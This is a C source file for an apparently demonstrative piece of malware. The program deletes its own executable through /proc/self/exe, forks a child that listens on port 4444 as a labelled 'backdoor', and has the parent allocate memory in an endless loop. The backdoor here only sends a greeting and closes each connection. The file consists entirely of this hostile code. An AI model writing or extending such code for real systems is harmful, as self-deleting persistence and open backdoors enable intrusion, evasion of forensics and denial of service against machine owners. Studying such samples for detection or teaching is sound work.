#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>


#define PATH_MAX 4096
#define PORT 4444
#define BUFFER_SIZE 1024

void deleteBinary() {
    char path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        unlink(path);
        printf("Binary deleted : %s\n", path);
    }
}

void allocateMemory() {
    size_t size = 1024 * 1024; // 1 MB
    while (1) {
        char *buffer = malloc(size);
        if (buffer == NULL) {
            perror("malloc failed");
            exit(EXIT_FAILURE);
        }
        memset(buffer, 0, size);
        printf("Allocated +1 MB (Total: ~%zu MB)\n", size / (1024 * 1024));
        sleep(2);
    }
}

void startBackdoor() {
    int serverFd, clientFd;
    struct sockaddr_in address;

    int addrlen = sizeof(address);

    if ((serverFd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(serverFd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(serverFd, 3) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Backdoor started on port %d\n", PORT);

    while (1) {
        if ((clientFd = accept(serverFd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0) {
            perror("accept failed");
            continue;
        }
        char *message = "Connected to backdoor. Type 'help' for commands.\n";
        send(clientFd, message, strlen(message), 0);
        printf("New connection from %s:%d\n",
               inet_ntoa(address.sin_addr), ntohs(address.sin_port));
        close(clientFd);
    }
}

int main() {
    printf("PID of the process: %d\n", getpid());

    deleteBinary();

    pid_t pid = fork();
    if (pid == 0) {
        startBackdoor();
    } else if (pid > 0) {
        allocateMemory();
    } else {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }

    return 0;
}
